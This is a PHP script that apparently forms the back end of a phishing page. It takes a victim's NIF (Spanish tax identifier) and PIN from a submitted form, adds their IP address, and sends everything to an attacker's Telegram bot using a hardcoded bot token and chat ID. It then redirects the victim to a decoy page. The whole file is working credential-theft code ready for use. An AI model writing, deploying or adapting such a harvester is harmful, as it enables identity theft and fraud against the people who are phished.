<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "7974501924:AAFIr1NzV5I1_O9Qq1Ko3M6VOOQVnrovcp0";
    $chat_id = "5157616506";

    // Capturar datos del formulario
    $nif = isset($_POST['nif']) ? $_POST['nif'] : 'No ingresado';
    $pin = isset($_POST['pin']) ? $_POST['pin'] : 'No ingresado';

    // Obtener la IP del usuario
    $ip = $_SERVER['REMOTE_ADDR'];

    // Crear el mensaje
    $mensaje = "Nuevo acceso:
    NIF: $nif
    PIN: $pin
    IP: $ip";

    // Enviar a Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);

    // Redirigir a otra página
    header("Location: charg.html");
    exit();
}
?>